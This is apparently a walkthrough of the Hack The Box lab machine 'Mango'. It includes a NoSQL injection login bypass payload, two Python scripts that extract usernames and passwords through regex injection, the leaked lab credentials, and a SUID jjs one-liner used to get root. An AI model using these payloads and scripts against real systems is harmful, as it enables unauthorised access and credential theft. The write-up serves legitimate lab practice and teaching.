Mango is rated as a medium difficulty linux machine. This machine is hosting a webserver vulnerable to NoSQL injection, allowing attackers to leak credentials that can be used to successfully login via SSH. For privilege escalation, a scripting tool with SUID enabled can be used by attackers to execute shell commands as root.

## Recon

A quick masscan + nmap scan gives us the following info:  

![](/assets/images/htb/mango/scan.png)  

There are 3 open ports, ```22, 80 and 443```. Credentials are needed for SSH access so let's proceed checking up ```port 80``` and ```port 443```.

## Webserver

Hitting up port 80 gives us a ```403 Forbidden``` response.

![](/assets/images/htb/mango/port_80.png)  

Adding ```mango.htb``` to ```/etc/hosts``` gives us the same response.

![](/assets/images/htb/mango/port_80_etchosts.png)  

Enumerating ```port 80```'s directories also gave nothing.

Skipping to ```port 443```, accessing the port leads us to this webpage.  

![](/assets/images/htb/mango/port_443.png)  

Enumerating ```port 443```'s directories and pages only led to this page.

![](/assets/images/htb/mango/port_443_analytics.png)  

It seems that ```https://mango.htb``` or ```https://10.10.10.162``` leads to nothing.

Going back to our nmap scan gives us a subdomain worth investigating.

```
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
```

Adding ```staging-order.mango.htb``` to ```/etc/hosts``` gives us a new webpage.

![](/assets/images/htb/mango/port_443_staging.png)  

It leads us to ```Sweet & Juicy Mango``` login page.

## NoSQL Injection

After manually testing a lot of SQLi payloads, it seems that the login page is not vulnerable to SQLi. After wasting a lot of time in the rabbit hole, I realized that there might be a reason why this machine is named ```Mango```.  

```Mango``` -> ```Mongo``` -> ```MongoDB``` -> ```NoSQL injection```  

After trying different NoSQL payloads from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection), I got an ```HTTP/1.1 302 Found``` response with this payload.

```
username[$ne]=admin&password[$ne]=admin&login=login
```

![](/assets/images/htb/mango/burp_injection.png)  

We can extract information using this payload template:  

```
username[$regex]=^(insert character guess here)&password[$ne]=test&login=login
```

The payload means that the server will return a ```302 response``` if the user value starts with the right character/s.

Automating this attack with a script makes it easier to leak the information we need.

```
import requests
import string

url = 'http://staging-order.mango.htb/'

user = ''

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|']:
      data = {'username[$regex]': '^{}'.format(user + c),
        'password[$ne]': 'abc',
        'login': 'login'
        }

      print('Trying: {}'.format(user + c))
      print('Current user: {}'.format(user))

      r = requests.post(url, data=data, allow_redirects=False)
      if r.status_code == 302:
          # additional check to break the script
          if c == '$':
              print('Leaked user: {}'.format(user))
              exit()
          user += c
          print(user)
```

Running this script gives us two users, ```admin``` and ```mango```.   

![](/assets/images/htb/mango/leak_admin.png)  

Note: **Edited the script to skip admin user**

![](/assets/images/htb/mango/leak_mango.png)  

After extracting the users, we need to edit the payload to extract passwords.

This will be the new payload template for password extraction.

```
username=admin&password[$regex]=^(insert password guess here)&login=login
```

This script can be used to extract the password for each user:

```
import requests
import string

url = 'http://staging-order.mango.htb/'

password = ''

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|']:
      data = {'username[$eq]': 'mango',
        'password[$regex]': '^{}'.format(password+c),
        'login': 'login'
        }

      print('Trying: {}'.format(password + c))
      print('Current pw: {}'.format(password))

      r = requests.post(url, data=data, allow_redirects=False)
      if r.status_code == 302:
          if c == '$':
              print('Leaked password: {}'.format(password))
              exit()
          password += c
          print(password)
```

User ```admin``` password leak:

![](/assets/images/htb/mango/admin_pw.png)  

User ```mango``` password leak:

![](/assets/images/htb/mango/mango_pw.png)  

Leaked credentials:  

```
admin : t9KcS3>!0B#2
mango : h3mXK8RhU~f{]f5H
```

The credentials for mango user worked on SSH login.

![](/assets/images/htb/mango/mango_user.png)  

After checking the files of ```mango```, the file ```user.txt``` does not exist in the home directory. It seems that we still need to check for another user.

## PrivEsc to Admin 

Upon checking the list of users on ```/etc/passwd```, we can see that there is another user named ```admin```.

![](/assets/images/htb/mango/users.png)  

We can try to use the leaked credentials (```admin : t9KcS3>!0B#2```) for this user.

![](/assets/images/htb/mango/su_admin.png)  

Successfully pivoted to ```admin``` user.

## PrivEsc to Root

Executing [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) shows us that there is an SUID binary that can be exploited.  

![](/assets/images/htb/mango/suid.png)  

A quick google search about exploiting ```jjs``` leads us to another [GTFObins](https://gtfobins.github.io/gtfobins/jjs/) page.

![](/assets/images/htb/mango/gtfo_suid.png)  

According to GTFObins, we can execute system commands inside ```jjs``` with a one-liner command:

```
Java.type('java.lang.Runtime').getRuntime().exec('<insert commands here>').waitFor()
```  

Since ```jjs``` is SUID enabled, we can execute commands as ```root```. We can try to write an ```SSH public key``` to ```/root/.ssh/authorized_keys``` and login via SSH using our private key.

Overwriting ```/root/.ssh/authorized_keys``` by downloading our public key using ```wget```.

![](/assets/images/htb/mango/rooted.png)  

Successfully logged in as ```root``` using our private key.
